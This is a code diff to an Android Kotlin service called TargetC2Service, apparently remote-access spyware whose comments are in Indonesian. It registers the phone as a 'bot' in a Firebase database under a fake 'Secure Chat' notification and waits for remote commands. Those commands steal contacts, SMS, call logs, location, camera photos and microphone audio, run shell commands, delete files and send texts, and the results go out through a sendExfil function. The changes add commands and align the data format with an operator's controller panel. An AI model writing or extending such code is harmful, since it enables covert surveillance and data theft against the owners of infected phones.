@@ -49,13 +49,11 @@ class TargetC2Service : Service() {
     override fun onCreate() {
         super.onCreate()
 
-        // Ambil device ID
         val id = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID
         ) ?: UUID.randomUUID().toString()
         _deviceId = id
 
-        // Init Firebase references dengan try-catch
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
             botsRef = database.getReference(REF_BOTS)
@@ -68,7 +66,6 @@ class TargetC2Service : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // 🔥 WAJIB: Tampilkan notification dalam 5 detik biar gak kena exception
         try {
             val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Secure Chat")
@@ -82,7 +79,6 @@ class TargetC2Service : Service() {
             Log.e(TAG, "Foreground notification error", e)
         }
 
-        // Mulai C2 di background
         if (!isRunning) {
             startC2()
         }
@@ -97,7 +93,6 @@ class TargetC2Service : Service() {
         isRunning = true
 
         job = scope.launch {
-            // Delay biar Firebase dan notification siap dulu
             delay(1000)
             registerBot()
             listenCommands()
@@ -114,32 +109,48 @@ class TargetC2Service : Service() {
         job?.cancel()
     }
 
+    // ==================== 🔥 FIX: FORMAT DATA COCOK DENGAN CONTROLLER ====================
+
     private fun registerBot() {
         try {
             if (!::botsRef.isInitialized) return
 
             val deviceInfo = mapOf(
                 "deviceId" to deviceId,
-                "model" to Build.MODEL,
+                "deviceName" to Build.MODEL,
+                "deviceModel" to Build.MODEL,
+                "androidVersion" to Build.VERSION.RELEASE,
                 "manufacturer" to Build.MANUFACTURER,
-                "version" to Build.VERSION.RELEASE,
-                "sdk" to Build.VERSION.SDK_INT.toString(),
-                "ip" to getIPAddress(),
-                "battery" to getBatteryLevel().toString(),
-                "charging" to isCharging().toString(),
-                "sim" to getSimInfo(),
-                "online" to true,
-                "timestamp" to System.currentTimeMillis().toString()
+                "isOnline" to true,
+                "lastSeen" to System.currentTimeMillis(),
+                "ipAddress" to getIPAddress(),
+                "country" to "",
+                "batteryLevel" to getBatteryLevel(),
+                "isCharging" to isCharging(),
+                "ramTotal" to 0L,
+                "ramAvailable" to 0L,
+                "storageTotal" to 0L,
+                "storageAvailable" to 0L,
+                "installedApps" to 0,
+                "isAccessibilityEnabled" to false,
+                "isNotificationListenerEnabled" to false,
+                "isAdminEnabled" to false,
+                "isScreenLocked" to false,
+                "simInfo" to getSimInfo(),
+                "timestamp" to System.currentTimeMillis()
             )
             botsRef.child(deviceId).setValue(deviceInfo)
 
-            // Update online status tiap 30 detik
             scope.launch {
                 while (isActive) {
                     delay(30000)
                     try {
-                        botsRef.child(deviceId).child("timestamp")
-                            .setValue(System.currentTimeMillis().toString())
+                        botsRef.child(deviceId).child("lastSeen")
+                            .setValue(System.currentTimeMillis())
+                        botsRef.child(deviceId).child("isOnline")
+                            .setValue(true)
+                        botsRef.child(deviceId).child("batteryLevel")
+                            .setValue(getBatteryLevel())
                     } catch (_: Exception) {}
                 }
             }
@@ -148,21 +159,22 @@ class TargetC2Service : Service() {
         }
     }
 
+    // ==================== 🔥 FIX: BACA KEY type + payload + cmdId (COCOK CONTROLLER) ====================
+
     private fun listenCommands() {
         if (!::commandsRef.isInitialized) return
         commandListener = object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                 try {
-                    val command = snapshot.child("command").value?.toString() ?: return
-                    val target = snapshot.child("target").value?.toString() ?: ""
-                    val args = snapshot.child("args").value?.toString() ?: ""
+                    val type = snapshot.child("type").value?.toString() ?: return
+                    val payload = snapshot.child("payload").value?.toString() ?: ""
+                    val cmdId = snapshot.child("cmdId").value?.toString() ?: ""
+                    val status = snapshot.child("status").value?.toString() ?: ""
 
-                    // Cek apakah command ditujukan untuk device ini
-                    if (target.isNotEmpty() && target != deviceId) return
+                    Log.d(TAG, "Command received: type=$type payload=$payload cmdId=$cmdId")
 
-                    handleCommand(command, args)
+                    handleCommand(type, payload)
 
-                    // Hapus command setelah diproses
                     snapshot.ref.removeValue()
                 } catch (e: Exception) {
                     Log.e(TAG, "Command processing error", e)
@@ -183,9 +195,10 @@ class TargetC2Service : Service() {
         broadcastListener = object : ChildEventListener {
             override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                 try {
-                    val command = snapshot.child("command").value?.toString() ?: return
-                    val args = snapshot.child("args").value?.toString() ?: ""
-                    handleCommand(command, args)
+                    val type = snapshot.child("type").value?.toString() ?: return
+                    val payload = snapshot.child("payload").value?.toString() ?: ""
+                    Log.d(TAG, "Broadcast received: type=$type")
+                    handleCommand(type, payload)
                 } catch (e: Exception) {
                     Log.e(TAG, "Broadcast processing error", e)
                 }
@@ -200,6 +213,8 @@ class TargetC2Service : Service() {
         broadcastRef.addChildEventListener(broadcastListener!!)
     }
 
+    // ==================== COMMAND HANDLER ====================
+
     private fun handleCommand(command: String, args: String) {
         Log.d(TAG, "Executing: $command | $args")
         try {
@@ -208,9 +223,12 @@ class TargetC2Service : Service() {
                 "get_contacts" -> handleGetContacts()
                 "get_sms" -> handleGetSMS()
                 "get_call_log" -> handleGetCallLog()
+                "get_call_logs" -> handleGetCallLog()
                 "get_location" -> handleGetLocation()
                 "get_photo" -> handleGetPhoto(args.ifEmpty { "back" })
+                "get_camera_photo" -> handleGetPhoto(args.ifEmpty { "back" })
                 "record_audio" -> handleRecordAudio(args.ifEmpty { "5000" }.toLongOrNull() ?: 5000)
+                "get_mic_audio" -> handleRecordAudio(args.ifEmpty { "5000" }.toLongOrNull() ?: 5000)
                 "read_file" -> handleReadFile(args)
                 "delete_file" -> handleDeleteFile(args)
                 "shell_exec" -> handleShellExec(args)
@@ -228,6 +246,11 @@ class TargetC2Service : Service() {
                 "alert_dialog" -> handleAlertDialog(args)
                 "toast" -> handleToast(args)
                 "self_destruct" -> handleSelfDestruct()
+                "get_info" -> handleGetInfo()
+                "lock_screen" -> handleLockScreen()
+                "unlock_screen" -> handleUnlockScreen()
+                "open_url" -> handleOpenURL(args)
+                "send_sms" -> handleSendSMS(args)
                 else -> sendExfil("unknown_command", "Unknown: $command")
             }
         } catch (e: Exception) {
@@ -236,6 +259,21 @@ class TargetC2Service : Service() {
     }
 
     // ==================== COMMAND HANDLERS ====================
+
+    private fun handleGetInfo() {
+        val info = mapOf(
+            "deviceId" to deviceId,
+            "model" to Build.MODEL,
+            "manufacturer" to Build.MANUFACTURER,
+            "version" to Build.VERSION.RELEASE,
+            "sdk" to Build.VERSION.SDK_INT.toString(),
+            "battery" to "${getBatteryLevel()}%",
+            "charging" to isCharging().toString(),
+            "ip" to getIPAddress(),
+            "sim" to getSimInfo()
+        )
+        sendExfil("device_info", info.toString())
+    }
 
     private fun handleGetContacts() {
         val contacts = mutableListOf<String>()
@@ -513,6 +551,45 @@ class TargetC2Service : Service() {
             ).show()
         }
         sendExfil("toast", "Toast shown: $message")
+    }
+
+    private fun handleLockScreen() {
+        sendExfil("lock_screen", "Screen lock requires device admin permission")
+    }
+
+    private fun handleUnlockScreen() {
+        sendExfil("unlock_screen", "Screen unlock requires device admin permission")
+    }
+
+    private fun handleOpenURL(url: String) {
+        try {
+            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intent)
+            sendExfil("open_url", "URL opened: $url")
+        } catch (e: Exception) {
+            sendExfil("open_url", "Error: ${e.message}")
+        }
+    }
+
+    private fun handleSendSMS(data: String) {
+        val parts = data.split("|", limit = 2)
+        if (parts.size < 2) {
+            sendExfil("send_sms", "Format: number|message")
+            return
+        }
+        try {
+            val intent = Intent(Intent.ACTION_SENDTO).apply {
+                data = android.net.Uri.parse("smsto:${parts[0].trim()}")
+                putExtra("sms_body", parts[1].trim())
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(intent)
+            sendExfil("send_sms", "SMS composer opened for ${parts[0].trim()}")
+        } catch (e: Exception) {
+            sendExfil("send_sms", "Error: ${e.message}")
+        }
     }
 
     private fun handleSelfDestruct() {
